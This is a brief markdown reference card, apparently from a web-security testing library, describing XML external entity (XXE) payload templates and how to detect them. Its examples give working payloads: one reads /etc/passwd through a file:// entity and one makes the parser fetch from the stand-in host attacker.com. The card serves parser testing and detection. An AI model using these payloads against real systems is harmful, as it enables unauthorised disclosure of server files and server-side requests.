# XXE Payload Templates

## Overview
- Purpose: Provide reusable XXE payloads for testing entity resolution against local files or remote URLs.
- Category: web_security
- Severity: info
- Tags: xxe, payloads, web_security, xml

## Context and Use-Cases
- Testing XML parsers for unsafe external entity resolution.

## Key Parameters and Inputs
- attack_type (string): "xxe"
- complexity (string): one of [basic]

## Procedure
1. Submit XML documents with external entity definitions.
2. Observe if local file disclosure or remote fetch occurs.

## Examples
- Payloads:
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>
```

## Indicators / Detection
- Patterns: `<!DOCTYPE ... <!ENTITY ... SYSTEM ...>`, use of `file://` or `http://` in XML.

## Limitations and Caveats
- Risk classification is keyword-based.

## Source Excerpts
- [S1] "xxe": { "basic": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", ...] }

## References
-
